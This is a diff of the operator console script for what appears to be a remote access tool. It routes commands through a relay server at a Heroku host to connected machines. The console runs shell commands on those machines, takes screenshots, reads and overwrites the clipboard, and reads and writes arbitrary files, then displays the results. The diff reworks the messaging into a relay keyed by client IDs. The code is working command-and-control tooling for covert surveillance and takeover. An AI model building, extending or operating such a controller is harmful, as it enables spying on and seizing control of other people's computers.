@@ -10,11 +10,12 @@
     <script defer>
         var variable = {
             address: "localhost",
-            port: 5051,
+            port: 80,
+            currentID: "",
         }
 
-        const socket = io(`ws://${prompt()}:${variable.port}`);
-        socket.on("connectionEstablished", (arg)=>{displayAppend("Connected!", "success")})
+        const socket = io(`ws://rhymesync-server.herokuapp.com:80`);
+        socket.on("connectionEstablished", (arg)=>{displayAppend("Connected to server!", "success")})
         var reader = new FileReader();
 
 
@@ -49,54 +50,66 @@
         }
         function getID(){
             if (document.getElementById("id").value == ""){
-                return Math.random().toString()
+                variable.currentID = Math.random().toString()
             }else{
-                return document.getElementById("id").value
+                variable.currentID = document.getElementById("id").value
             }
+            return variable.currentID
         }
 
-        function runCmd(){
-            socket.emit("runCmd", {id: getID(), cmd: document.getElementById("input").value})
-            socket.on("returnCmd", (arg)=>{
-                if (arg.return.stdeer){
-                    displayAppend(arg.return.stdeer, "error")
-                }else{
-                    displayAppend(arg.return.stdout, "success")
+
+        socket.on("debuggerReceiver", (arg)=>{
+            if (arg.id == variable.currentID){
+                if (arg.type == "returnCmd"){
+                    if (arg.return.stdeer){
+                        displayAppend(arg.return.stdeer, "error")
+                    }else{
+                        displayAppend(arg.return.stdout, "success")
+                    }
                 }
-            })
+                if (arg.type == "returnScreenshot"){
+                    displayAppend(arg.return, "image")
+                }
+                if (arg.type == "returnClipboard"){
+                    displayAppend(arg.return)
+                }
+                if (arg.type == "returnCopyToClipboard"){
+                    displayAppend(arg.return)
+                }
+                if (arg.type == "returnWriteFile"){
+                    if(arg.return){displayAppend("File Successfully Written", "success")}
+                    else{displayAppend("Error Writting File", "error")}
+                }
+                if (arg.type == "returnReadFile"){
+                    if(arg.return!=false){
+                        displayAppend(arg.return, "success")
+                    }else{displayAppend("Error Reading File", "error")}
+                }
+            }
+            else{
+                console.log("Transmission from Different ID Detected!")
+            }
+
+        })
+
+
+        function runCmd(){
+            socket.emit("sendDataToOthers", {type: "runCmd", id: getID(), cmd: document.getElementById("input").value})
         }
         function takeSS(){
-            socket.emit("takeScreenshot", {id: getID()})
-            socket.on("returnScreenshot", (arg)=>{
-                displayAppend(arg.return, "image")
-            })
+            socket.emit("sendDataToOthers", {type: "takeScreenshot", id: getID()})
         }
         function getCB(){
-            socket.emit("getClipboard", {id: getID()})
-            socket.on("returnClipboard", (arg)=>{
-                displayAppend(arg.return)
-            })
+            socket.emit("sendDataToOthers", {type: "getClipboard", id: getID()})
         }
         function setCB(){
-            socket.emit("copyToClipboard", {id: getID(), stringToCopy: document.getElementById("input").value})
-            socket.on("returnCopyToClipboard", (arg)=>{
-                displayAppend(arg.return)
-            })
+            socket.emit("sendDataToOthers", {type: "copyToClipboard", id: getID(), stringToCopy: document.getElementById("input").value})
         }
         function writeFile(){
-            socket.emit("writeFile", {id: getID(), directory: document.getElementById("input").value, bytesToWrite: prompt("bytesToWrite"), encoding: (prompt("base64? (yes/no)")=="yes"? "base64":"utf-8")})
-            socket.on("returnWriteFile", (arg)=>{
-                if(arg.return){displayAppend("File Successfully Written", "success")}
-                else{displayAppend("Error Writting File", "error")}
-            })
+            socket.emit("sendDataToOthers", {type: "writeFile", id: getID(), directory: document.getElementById("input").value, bytesToWrite: prompt("bytesToWrite"), encoding: (prompt("base64? (yes/no)")=="yes"? "base64":"utf-8")})
         }
         function readFile(){
-            socket.emit("readFile", {id: getID(), directory: document.getElementById("input").value, encoding: (prompt("base64? (yes/no)")=="yes"? "base64":"utf-8")})
-            socket.on("returnReadFile", (arg)=>{
-                if(arg.return!=false){
-                    displayAppend(arg.return, "success")
-                }else{displayAppend("Error Reading File", "error")}
-            })
+            socket.emit("sendDataToOthers", {type: "readFile", id: getID(), directory: document.getElementById("input").value, encoding: (prompt("base64? (yes/no)")=="yes"? "base64":"utf-8")})
         }
     </script>
     <style>
